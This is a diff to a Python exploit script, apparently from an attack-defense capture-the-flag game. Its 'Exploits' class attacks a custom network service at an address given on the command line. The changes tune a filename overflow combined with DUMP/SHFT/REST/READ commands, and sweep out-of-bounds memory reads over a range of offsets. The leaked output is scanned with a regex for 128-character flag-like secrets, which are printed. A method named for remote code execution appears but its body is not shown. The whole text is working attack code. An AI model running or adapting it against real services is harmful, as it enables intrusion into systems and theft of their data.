@@ -82,41 +82,50 @@ class Exploits(object):
 
     def OPEN_DUMP_overflow(self):
         #self.put_data()
-        for i in range(-4,4):
+        for i in range(-8,8):
             self.client.connect("")
             self.client.AUTH(b"\xde\xad\xbe\xef\xde\xad\xbe\xef"[::-1])
-            for j in range(8):
+            for j in range(4):
                 exploit_name = b"EXAMPLE_FILEEXAMPLE_FILEEXAMPLE"
                 if (i*j) < 0:
-                    exploit_name += bytes([0x40, 0xff+(i*j)])
+                    exploit_name += bytes([0xff, 0xff+(i*j)])
                 else:
-                    exploit_name += bytes([0x40, 0x00+(i*j)])
+                    exploit_name += bytes([0xff, 0x00+(i*j)])
                 self.client.OPEN(exploit_name)
                 self.client.CLSE("")
                 self.client.OPEN(b"EXPLOIT")
-                self.client.DUMP(b"\x00\x00\x40\x00")
+                self.client.DUMP(b"\x00\x00\x80\x00")
                 self.client.SHFT(b"\x00")
-                self.client.REST(b"\x00\x00\x40\x00")
-                result = self.client.READ(b"\x00\x00\x40\x00")[4:40].decode(errors="backslashreplace")
-                if re.findall(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", result):
+                self.client.REST(b"\x00\x00\x80\x00")
+                result = self.client.READ(b"\x00\x00\x40\x00")
+                result += self.client.READ(b"\x40\x00\x40\x00")
+                result = result.decode(errors="backslashreplace")
+                if re.findall(r"[a-z0-9]{128}", result):
                     print(result)
                 self.client.CLSE("")
             self.client.TERM("")
 
     def READ_amwr(self):
         #self.put_data()
-        self.client.connect("")
-        for i in range(-32,32):
-            if i < 0:
-                offset = bytes([0x40, 0xff+i])
-            elif i > 0:
-                offset = bytes([0x40, 0x00+i])
-            else:
-                continue
-            result = self.client.READ(offset + b"\x40\x00")[4:40].decode(errors="backslashreplace")
-            if re.findall(r"[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}", result):
-                print(result)
-        self.client.TERM("")
+        for i in range(2):
+            self.client.connect("")
+            for i in range(-16,16):
+                if i < 0:
+                    offset = bytes([0x00, 0xff+i])
+                elif i > 0:
+                    offset = bytes([0x00, 0x00+i])
+                else:
+                    continue
+                result = self.client.READ(offset + b"\x40\x00")
+                if i < 0:
+                    offset = bytes([0x40, 0xff+i])
+                elif i > 0:
+                    offset = bytes([0x40, 0x00+i])
+                result += self.client.READ(offset + b"\x40\x00")
+                result = result.decode(errors="backslashreplace")
+                if re.findall(r"[a-z0-9]{128}", result):
+                    print(result)
+            self.client.TERM("")
 
     def ENCD_amwr_rce(self):
         #self.put_data()
@@ -151,4 +160,4 @@ class Exploits(object):
 
 address = sys.argv[1]
 exploits = Exploits(address)
-exploits.ENCD_amwr_rce()
+exploits.OPEN_DUMP_overflow()
